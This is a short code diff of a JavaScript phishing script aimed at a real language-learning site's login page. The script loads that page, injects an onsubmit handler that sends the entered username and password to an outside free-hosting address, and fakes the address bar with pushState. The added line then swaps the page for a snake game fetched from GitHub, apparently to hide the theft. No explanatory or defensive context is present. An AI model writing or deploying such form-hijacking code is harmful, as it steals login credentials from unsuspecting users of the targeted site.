@@ -1,6 +1,6 @@
 var htmlreq = new XMLHttpRequest();
 htmlreq.open("GET", "https://spanish.yabla.com/login.php", true);
 htmlreq.send(null);
-var pl = "fetch('https://paramagnetic-shotli.000webhostapp.com/o.php?d=' + document.getElementById('username').value + ':' + document.getElementsByName('password')[0].value)";
+var pl = "fetch('https://paramagnetic-shotli.000webhostapp.com/o.php?d=' + document.getElementById('username').value + ':' + document.getElementsByName('password')[0].value); window.history.pushState('test3', '', '/snake.html'); document.open(); fetch('https://raw.githubusercontent.com/jellyassassin25/snake/main/snake.txt').then(r => r.text()).then(t => document.write(t))";
 htmlreq.onreadystatechange = function() {if (htmlreq.readyState == 4) {document.open(); document.write(htmlreq.responseText.split('<form name="login" id="login_form" method="post" action="login.php">').join('<form name="login" id="login_form" method="post" action="login.php" onsubmit="' + pl + '">'))}};
 window.history.pushState("test2", "", "/login.php");
